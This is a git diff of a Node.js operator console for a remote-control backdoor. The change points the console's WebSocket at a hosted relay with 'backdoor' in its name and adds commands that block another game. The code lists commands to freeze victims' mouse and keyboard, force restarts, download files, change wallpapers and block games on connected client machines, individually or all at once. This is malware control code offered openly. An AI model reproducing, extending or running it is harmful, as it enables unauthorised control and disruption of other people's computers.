@@ -1,9 +1,10 @@
 const WebSocket = require("ws"); // CJS Only for packing (pkg)
 const readline = require("readline");
 
-const ws = new WebSocket("ws://localhost:8602");
+const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
+// const ws = new WebSocket("ws://localhost:8602");
 
-const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nDW - Download something  BV - Block Valorant\nUV - Unblock Valorant    CUI - COOK PC UI!!\nBYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
+const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nDW - Download something  BV - Block Valorant\nUV - Unblock Valorant   CUI - COOK PC UI!!\nBYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -26,6 +27,8 @@ const commandsMap = {
   "SF": "SAFE_RESTART",
   "BV": "BLOCK_VALORANT",
   "UV": "UNBLOCK_VALORANT",
+  "BMKG": "BLOCK_MKG",
+  "UMKG": "UNBLOCK_MKG",
   "BYE": "BYE",
   spcArgs: { "A": "ALL" }
 };
